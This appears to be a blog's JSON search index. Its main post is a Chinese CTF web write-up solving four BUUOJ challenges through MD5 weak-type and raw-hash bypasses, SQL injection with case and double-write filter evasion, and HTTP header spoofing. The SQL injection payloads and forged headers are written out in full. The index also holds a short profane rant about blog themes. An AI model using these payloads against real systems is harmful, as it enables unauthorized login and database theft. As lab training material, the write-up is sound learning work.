[{"title":"简单题目web","url":"/2022/07/27/flag-md/","content":"\n# 简单题目ctf-web\n\n## 弱类型md5题目\n\n[[BJDCTF2020]Easy MD5](https://buuoj.cn/challenges#[BJDCTF2020]Easy%20MD5)\n\n抓包后看到如下关键代码：\n\n> ![image-20220713170111886](/images/image-20220726203931883.png)\n\n一个特殊的字符[**ffifdyop**](http://t.zoukankan.com/tqing-p-11852990.html)：md5加密后的结果再经过ASCII转换后，前几位的结果是 `'or'6` ，这刚好是一个mysql查询万能密码，\n\n源代码的mysql查询语句就有可能\n\n从 `select * from 'admin' where password=md5($pass,true)`\n\n变成 `select * from 'admin' where password=''or'6xxxxx' ` 从而完成查询\n\n> <img src=\"images/image-20220726204006390.png\" alt=\"image-20220726204006390\" style=\"zoom:150%;\" />\n>\n> \n\n\n\n简单的弱类型相等，只要做到a和b的值不一样，但md5值都是0e开头即可\n\n`?a=s155964671&b=240610708`\n\n|      $a       |             md5($a)              |\n| :-----------: | :------------------------------: |\n|  s155964671a  | 0e342768416822451524974117254469 |\n|   240610708   | 0e462097431906509019562988736854 |\n|    QNKCDZO    | 0e830400451993494058024219903391 |\n| 0e00928251504 | 0e148856674729228041723861799600 |\n\n> ![image-20220726205420110](../images/image-20220726205420110.png)\n\nmd5的数组绕过，在php中数组的md5值为NULL，即`md5(array($a))==NULL`，所以只需要传递param1和param2两个数组类型的不同的值就可以了\n\nhackbar中post传入 `param1[]=1&param2[]=2`\n\n## sql注入、md5、大小写绕过\n\n[[GXYCTF2019]BabySQli](https://buuoj.cn/challenges#[GXYCTF2019]BabySQli)\n\n简单尝试可知，UserName为`admin`\n\n注入点UserName有很多字符过滤，尝试大写字母的 `ORDER BY` 发现可以绕过\n\n`111' ORDER BY 1;#`\t\t尝试查询发现共3个字段，可以知道的是，这三个字段一个是UserName，一个是password\n\n`111' UNION SELECT 1,'admin',3;#`\t\t将字符串 'admin'，依次放入第一二三字段尝试，当在第二字段时提示 wrong password\n\n可知第二字段存放UserName\n\n到这时，只需要找到存放password的字段，将任意一个数的md5值放到该字段，再在password框中输入这个数即可\n\n如下，随意一个数 `666` 的md5值为 `fae0b27c451c728867a567e8c1bb4e53`\n\nUserName 框：`111' UNION SELECT 1,'admin','fae0b27c451c728867a567e8c1bb4e53';#`\n\npassword 框：`666`\n\n即可成功登录，得到flag\n\n## sql注入、双写绕过\n\n[[极客大挑战 2019]BabySQL](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]BabySQL)\n\n`1' or 1=1;#` 尝试万能密码，出现sql报错，但不确定原因\n\n`1' order by 1;#` 尝试查看字段数，可以看出`or` 和 `by`被过滤了\n\n`1' oorrder bbyy 1;#` 双写绕过成功，查到共3个字段\n\n`1' union select 1,2,3;#` 联合查询，通过报错提示大概可以知道，`union` `select` 也被过滤了\n\n`1' ununionion seselectlect 1,2,3;#` 双写绕过，看到回显位置\n\n`1' ununionion seselectlect 1,2,group_concat(schema_name) from information_schema.schemata;#`  已知`or`被过滤了，猜测关键字`from`也可能被过滤了\n\n`1' ununionion seselectlect 1,2,group_concat(schema_name) frfromom infoorrmation_schema.schemata;#` 查询成功，得到所有的数据库名\n\n`1' ununionion seselectlect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables wwherehere table_schema=database()#`\t查询当前数据库中所有表名，关键字`where` 也被过滤了\n\n`1' ununionion seselectlect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name='b4bsql';#`   查询表名为b4bsql的所有字段名\n\n`1' ununionion seselectlect 1,2,group_concat(passwoorrd) frfromom b4bsql;#`   查询表名为b4bsql的字段为passowrd的所有数据，得到flag\n\n注意：\n\n1. 单词的拼写，双写绕过的单词很容易拼错\n2. 具体是哪些关键字被绕过了，要看给出的sql报错语句，还要加以猜测\n3. 只有被过滤的具体单词或几个字母才能用双写绕过，比如`or` 这两个字母被过滤了，那`order` 就只能双写成`oorrder`绕过过滤\n4. 变量名在有些地方要有引号，有些地方则不需要\n\n本题中数据库名为`ctf` 的数据库中也存有flag\n\n`1' ununionion seselectlect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema='ctf'#`\t得到数据库ctf中的表名Flag\n\n`1' ununionion seselectlect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name='Flag'#`   查询表名为Flag的所有字段名，得到flag\n\n`1' ununionion seselectlect 1,2,group_concat(flag) frfromom ctf.Flag#`   查询ctf库中Flag表的flag字段的内容，得到flag\n\n## http基础\n\n[[极客大挑战 2019]Http](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Http)\n\n抓包，看到css代码中隐藏着一个Secret.php文件\n\n![image-20220801193321071](../images/image-20220801193321071.png)\n\n在浏览器中进入该文件`http://node4.buuoj.cn:26711/Secret.php`\n\n提示不是来自一个地址，因此可以用burp suite伪造一个请求源\t`Referer: https://Sycsecret.buuoj.cn`\n\n接着提示没有使用 \"Syclover\" browser ，可以改写 `User-Agent: \"Syclover\" browser`\n\n然后提示只能本地访问，于是伪造访问源地址 `X-Forwarded-For: 127.0.0.1`，最后得到flag\n\n所有的请求头信息如下图，在 Secret.php 中一共改写了三行信息（第3、4、9行），值得注意的是，每行请求信息的顺序基本是一定的，不能轻易改变，不然很可能发送失败\n\n![image-20220801204434225](../images/image-20220801204434225.png)\n","tags":["web","ctf"],"categories":["ctf-web例题"]},{"title":"Hello Weblog","url":"/2022/07/25/weblog-md/","content":"\n\n\n\n\n有些博客主题的配置文件写的还不如一坨狗屎完整，他妈的。\n\n在此推荐一个比较好的主题配置文件，[请点击查看。](https://theme-stun.github.io/docs/zh-CN/)\n","tags":["吐槽"],"categories":["闲谈"]}]